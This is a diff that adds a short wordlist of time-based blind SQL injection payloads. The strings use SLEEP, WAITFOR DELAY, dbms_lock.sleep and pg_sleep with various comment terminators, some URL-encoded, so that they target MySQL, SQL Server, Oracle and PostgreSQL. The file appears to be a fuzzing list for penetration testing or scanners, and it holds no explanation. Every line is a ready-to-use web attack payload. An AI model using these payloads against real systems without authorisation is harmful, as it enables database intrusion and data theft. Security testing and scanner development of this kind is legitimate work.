@@ -1,0 +1,16 @@
+' OR SLEEP(5)=0 #
+' OR SLEEP(5)=0/*
+' OR SLEEP(5)=0%23
+' OR SLEEP(5)=0%2F%2A
+' OR WAITFOR DELAY '00:00:05' --
+'; WAITFOR DELAY '00:00:05' --
+') WAITFOR DELAY '00:00:05' --
+' OR WAITFOR DELAY '00:00:05' %23
+' OR dbms_lock.sleep(5)='1' --
+' OR dbms_lock.sleep(5)='1' %23
+' OR dbms_lock.sleep(5)='1' /*
+' OR dbms_lock.sleep(5)='1' %2F%2A
+' OR pg_sleep(5)=0 --
+' OR pg_sleep(5)=0 %23
+' OR pg_sleep(5)=0 /*
+' OR pg_sleep(5)=0 %2F%2A
